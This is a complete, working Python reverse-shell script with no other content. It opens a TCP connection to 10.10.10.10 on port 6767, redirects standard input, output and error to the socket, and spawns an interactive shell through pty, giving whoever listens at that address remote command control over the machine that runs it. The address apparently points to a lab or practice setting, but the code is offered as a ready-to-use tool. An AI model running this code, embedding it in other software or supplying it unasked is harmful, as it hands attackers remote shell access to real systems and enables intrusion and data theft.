#######################################
# Define the target IP address and port
ip = "10.10.10.10"
port = 6767
#######################################
# Import necessary modules
import socket
import subprocess
import os
import pty
#######################################
# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
#######################################
# Redirect standard input to the socket
os.dup2(s.fileno(), 0)
# Redirect standard output to the socket
os.dup2(s.fileno(), 1)
# Redirect standard error to the socket
os.dup2(s.fileno(), 2)
# Spawn an interactive shell
pty.spawn("sh")
#######################################
